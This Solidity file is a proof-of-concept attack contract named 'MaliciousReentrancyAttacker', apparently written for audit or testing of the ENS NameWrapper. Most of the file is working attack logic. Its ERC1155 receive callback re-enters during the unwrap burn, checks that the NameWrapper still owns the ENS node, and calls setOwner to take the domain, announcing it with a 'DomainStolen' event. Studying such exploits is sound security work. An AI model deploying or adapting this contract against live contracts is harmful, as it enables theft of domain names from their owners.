// SPDX-License-Identifier: MIT
pragma solidity ~0.8.17;

import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/utils/introspection/ERC165.sol";

interface IENS {
    function owner(bytes32 node) external view returns (address);
    function setOwner(bytes32 node, address owner) external;
}

interface INameWrapper {
    function ens() external view returns (address);
    function unwrapETH2LD(bytes32 labelhash, address registrant, address controller) external;
    function ownerOf(uint256 id) external view returns (address);
}

contract MaliciousReentrancyAttacker is IERC1155Receiver, IERC721Receiver, ERC165 {
    IENS public ens;
    INameWrapper public nameWrapper;
    address public attacker;
    bytes32 public targetNode;
    bool public attackExecuted = false;
    address public stolenFrom;

    event AttackTriggered(bytes32 node, address victim, address attacker);
    event DomainStolen(bytes32 node, address from, address to);

    constructor(address _nameWrapper) {
        nameWrapper = INameWrapper(_nameWrapper);
        ens = IENS(nameWrapper.ens());
        attacker = msg.sender;
    }

    // ERC1155 callback - this executes during _burn() in _unwrap()
    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external returns (bytes4) {
        // CRITICAL: This executes DURING _unwrap() vulnerability window
        // Token is burned but ENS ownership not yet transferred

        if (!attackExecuted && id == uint256(targetNode)) {
            attackExecuted = true;
            stolenFrom = from;

            emit AttackTriggered(targetNode, from, attacker);

            // Check if ENS ownership is still with NameWrapper (vulnerability window)
            address currentOwner = ens.owner(targetNode);
            address nameWrapperAddr = address(nameWrapper);

            if (currentOwner == nameWrapperAddr) {
                // VULNERABILITY EXPLOITED: Steal the domain
                ens.setOwner(targetNode, attacker);
                emit DomainStolen(targetNode, currentOwner, attacker);
            }
        }

        return this.onERC1155Received.selector;
    }

    // ERC721 callback for completeness
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    // Initiate the attack by setting target and triggering unwrap
    function attack(bytes32 _targetNode) external {
        require(msg.sender == attacker, "Only attacker can initiate");
        targetNode = _targetNode;
        attackExecuted = false;

        // In a real attack, the victim would call this
        // Here we demonstrate the concept
    }

    // Check if contract supports interfaces
    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165) returns (bool) {
        return
            interfaceId == type(IERC1155Receiver).interfaceId ||
            interfaceId == type(IERC721Receiver).interfaceId ||
            super.supportsInterface(interfaceId);
    }

    // View functions for testing
    function getTargetNode() external view returns (bytes32) {
        return targetNode;
    }

    function isAttackExecuted() external view returns (bool) {
        return attackExecuted;
    }

    function getStolenFrom() external view returns (address) {
        return stolenFrom;
    }
}